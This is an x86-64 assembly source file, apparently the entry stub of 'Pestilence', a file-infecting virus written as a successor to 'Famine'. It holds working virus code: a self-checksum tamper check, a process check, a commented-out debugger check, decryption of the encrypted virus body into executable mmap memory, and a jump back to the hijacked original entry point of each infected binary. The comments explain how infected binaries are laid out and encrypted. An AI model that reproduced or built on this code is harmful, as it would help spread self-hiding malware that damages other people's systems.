;;;;;;;;;;;;;;;;;;;;;;;;;
;	text section		;
;	o_entry				;
;	string				;
;	virus				;
;	decrypt key			;
;	decrypter			;
;	data section		;
;;;;;;;;;;;;;;;;;;;;;;;;;

%define FAMINE_S
%include "pestilence.lst"

section .text
	global _start
	global _string
	global _verify_o_entry
	global _continue_normaly
	global _o_entry
	global _force_exit
	global _jmp_to_o_entry
	global _verif
;	extern _decrypt
;	extern _end_decrypt
;	extern _treat_file
;	extern _final_end
;	extern _thread_create
;	extern _start_infect
;	extern _infect_from_root
;	extern _verify_starting_infect
;	extern _famine_start_options
;   extern _fork_before_exec_normaly

_o_entry:
	dq 0x0000000000000000 

_string:
;	db 'Famine version 1.0 (c)oded by cdrouet-rludosan', 0
	db 'Pestilence version 1.0 (c)oded by cdrouet-rludosan', 0

;; Start of the program
_start:
	;; Create stack frame
	push	rbp
	mov		rbp, rsp
	sub		rsp, 24

	;; Save up all registers on stack
	push	rbx		; +8
	push	rcx		; +16
	push	rdx		; +24
	push	rsi		; +32
	push	rdi		; +40
	push	r8		; +48
	push	r9		; +56
	push	r10		; +64
	push	r11		; +72
	push	r12		; +80
	push	r13		; +88
	push	r14		; +96
	push	r15		; +104
	mov QWORD [rsp + 104], 0

_verify_checksum:
	lea rdi, [rel _text_section_vaddr]
	lea r10, [rel _total_size_to_checksum]
	xor rsi, rsi
	mov esi, DWORD [r10]
	call _crc32
	lea r10, [rel _checksum]
	cmp eax, DWORD [r10]
	jne _check_alternate_start

;_check_debugueur:
;	call _checkdbg
;	cmp rax, 0
;	jne _check_alternate_start
;	add QWORD [rsp + 104], 0x1
;	cmp rax, 0
;	jne _verify_o_entry

_check_processus:
	call _checkproc
	cmp rax, 0
	jne _check_alternate_start
	add QWORD [rsp + 104], 0x10
;	cmp QWORD [rsp + 104], 0x11
	jmp _check_famine_binary

_check_alternate_start:
	cmp QWORD [rsp + 136], 3
	jne _test_reg
	mov rdi, QWORD [rsp + 152]
	lea r10, [rel _verif]
	mov r10, QWORD [r10]
	cmp QWORD [rdi], r10
	je _force_exit
_test_reg:
	cmp QWORD [rsp + 64], 3
	jne _verify_o_entry
	mov rdi, QWORD [rsp + 72]
	mov rdi, QWORD [rsi + 8]
	lea r10, [rel _verif]
	mov r10, QWORD [r10]
	cmp QWORD [rdi], r10
	je _force_exit
	jmp _verify_o_entry

;	cmp rax, 0
;	jne _verify_o_entry

_check_famine_binary:
	;; If _o_entry label equals zero, we are into ./famine so we look for eventual arguments
	lea		rax, [rel _o_entry]
	cmp		QWORD [rax], 0
	je		_famine_start_options

; IMPORTANT: this is how an encryped binary looks like (It didn't concern the pestilence base binary):
; -----------
; text section
;
; entry_of_virus: <- THIS PART IS UNENCRYPTED FROM:
;	_o_entry
;	TO
;	_encrypted_part_start
;
; virus: <- THIS PART IS ENCRYPTED FROM:
; 	_encrypted_part_start
;	TO
; 	_final_end + 2
;
; key
; depacker 
; padding for page size
;
; rest of the file

; Dont forget that the decrypted part is on an MMAP. That's why we need to copy the entire file,
; to use the relative addr of the functions, like _o_entry and _string.

; Mmap, for the decrypted virus
	mov rax, SYS_MMAP
	mov rdi, 0
	mov rsi, PAGE_SIZE
	mov rdx, PROT_READ | PROT_WRITE | PROT_EXEC
	mov r10, MAP_ANONYMOUS | MAP_PRIVATE
	mov r8, -1
	mov r9, 0
	syscall
	cmp rax, 0
	jle _force_exit
	mov QWORD [rsp], rax

; Take encrypted part size
	lea rax, [rel _encrypted_part_start] ; take start addr
	lea rdx, [rel _padding] ; take end addr
;	add rdx, 2 ; add 2 for the leave/ret
	sub rdx, rax ; substract 

; Take first non-encrypted part size (_o_entry to _encrypted_part)
	lea r10, [rel _o_entry] ; take start addr
	sub rax, r10 ; sub with the end addr
	mov r11, rax ; store it on r11
	mov r10, rax
	add r10, rdx ; add encrypted part size, so we have the total virus size

; Copy the non-encrypted part on our mmap
	mov rdi, QWORD [rsp] ; take mmap addr
	lea rsi, [rel _o_entry] ; take our addr
	mov rcx, r11 ; we will copy just the unencrypted part
	cld
	rep movsb ; copy

; We will call decrypt but:
; We will decrypt ONLY encrypted code. So it didn't include the pestilence binary.
; Pestilence binary have a padding between _final_end and _decrypt,
; but when we infect others binaries, we copy _decrypt directly after _final_end + key_size, without
; any padding. So we need to recalculate the _decrypt addr: it's _final_end + 2 (the size of leave/ret instructions) + 256 (key_size)
; We don't have any conditions to check if their is a padding, because pestilence base code isn't
; encrypted, Only, infect binaries have the infection code encrypted.
	lea rax, [rel _padding] ; take _final_end addr
;	add rax, 2 ; add 2, to go on key addr
; Set parameters
	mov rdi, rax ; first parameter is the key
	lea rsi, [rel _encrypted_part_start] ; second parameter is the zone to decrypt
	; rdx is the zone size, calculated before.
; r10 is our addr where we store the decrypted code, it's:
; mmap_base_addr + unencrypted_copy_size
	mov r10, QWORD [rsp] ; take mmap base addr
	add r10, r11 ; take unencrypted_part_size
;	add rax, 256 ; now we add 256 to our key addr, to go on _decrypt
	call _decrypt ; and we call _decrypt

; Now we move our decrypter on our mmap directly after decrypted part + 256 (key_size)
	mov rdi, QWORD [rsp] ; take mmap addr
; Go to _decrypt
	lea rsi, [rel _decrypt]
; Calculate virus + key total size
	lea rcx, [rel _o_entry]
	mov r10, rsi
	sub r10, rcx
; Go to our decrypt on mmap
	add rdi, r10
; Calculate decrypt size
	lea rcx, [rel _end_decrypt]
	add rcx, 2
;	lea r10, [rel _decrypt]
	sub rcx, rsi
; Move it on mmap
	cld
	rep movsb

; Now, we have our decrypted part on our mmap, we need to call it, so:
; We take our unencrypted part size, and add it to our mmap_base_addr to go to our
; desencrypted part, and we jump in.
	lea r10, [rel _o_entry] ; take _o_entry_addr 
	lea r11, [rel _encrypted_part_start] ; take _encrypted_part_addr
	sub r11, r10 ; take our unencrypted part size
	mov rdi, QWORD [rsp] ; take mmap_addr
	add rdi, r11 ; add our offset to mmap_addr
	jmp rdi ; jmp in

;; Check if we need to jump to continue program (./infected) or simply terminate (./famine)
_verify_o_entry:
	lea		rax, [rel _o_entry]
	cmp		QWORD [rax], 0
	jne		_jmp_to_o_entry

;; Exit program
_force_exit:
	mov		rax, SYS_EXIT						; sys_exit
	mov		rdi, 0						; exit with 0
	syscall

;; Jump back to old entry point
_jmp_to_o_entry: 
	;; Pop off the stack all the registers saved at the begining of the program
	pop		r15
	pop		r14
	pop		r13
	pop		r12
	pop		r11
	pop		r10
	pop		r9
	pop		r8
	pop		rdi
	pop		rsi
	pop		rdx
	pop		rcx
	pop		rbx

	;; Destroy stack frame
	leave

	;; Jump to old entry
	jmp		[rax]

; Here is our verif code
_verif:
	dq 0x1122334455667788

%undef FAMINE_S
